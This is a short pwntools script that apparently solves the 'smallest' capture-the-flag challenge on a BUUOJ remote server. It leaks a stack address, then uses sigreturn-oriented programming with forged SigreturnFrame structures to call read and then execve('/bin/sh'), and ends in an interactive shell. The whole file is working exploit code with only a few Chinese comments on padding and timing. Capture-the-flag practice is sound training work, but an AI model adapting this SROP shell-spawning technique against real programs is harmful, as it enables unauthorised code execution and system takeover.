from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./smallest")
io=remote("node4.buuoj.cn",28027)

main=0x4000b0
syscall=0x4000be

payload=p64(main)*3
io.send(payload)

# gdb.attach(io)
# pause()

io.send(b"\xb3")
stack_addr=u64(io.recv()[0x8:0x10])
# stack_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
print("stack_addr: "+hex(stack_addr))


#read
sigframe=SigreturnFrame()
sigframe.rax=constants.SYS_read
sigframe.rdi=0
sigframe.rsi=stack_addr
sigframe.rsp=stack_addr
sigframe.rdx=0x400
sigframe.rip=syscall

payload=p64(main)+p64(0)+bytes(sigframe) #八个字节padding,出去信号机制的pop影响
io.send(payload)

sleep(1)  #远端防炸

payload=p64(syscall)+b"a"*7
io.send(payload)

#execve
sigframe=SigreturnFrame()
sigframe.rax=constants.SYS_execve
sigframe.rdi=stack_addr+0x190
sigframe.rsp=stack_addr
sigframe.rsi=0
sigframe.rdx=0
sigframe.rip=syscall

payload=p64(main)+p64(0)+bytes(sigframe)
payload=payload.ljust(0x190,b"\x00")+b"/bin/sh\x00"
io.send(payload)

sleep(1)

payload=p64(syscall)+b"a"*7
io.send(payload)

io.interactive()